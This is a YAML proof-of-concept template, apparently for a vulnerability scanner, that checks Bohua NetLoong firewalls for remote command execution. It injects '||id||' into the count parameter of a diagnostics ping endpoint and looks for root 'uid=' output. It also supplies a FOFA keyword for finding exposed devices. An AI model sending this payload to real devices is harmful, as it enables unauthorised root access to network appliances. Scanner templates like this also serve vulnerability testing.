name: poc-yaml-netLoong-fw-rce
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /diagnostics/cmd.php?action=ping&count=||id||
            headers:
                Content-Type: application/x-www-form-urlencoded
        expression: response.status == 200 && response.body.bcontains(b"root") && response.body.bcontains(b"uid=")
expression: r0()
detail:
    author: cysec
    links:
        - http://cysec.com
    fofakeyword: title="博华网龙信息安全一体机"
    vlninfo: 博华网龙防火墙 NetLoong 系列产品 RCE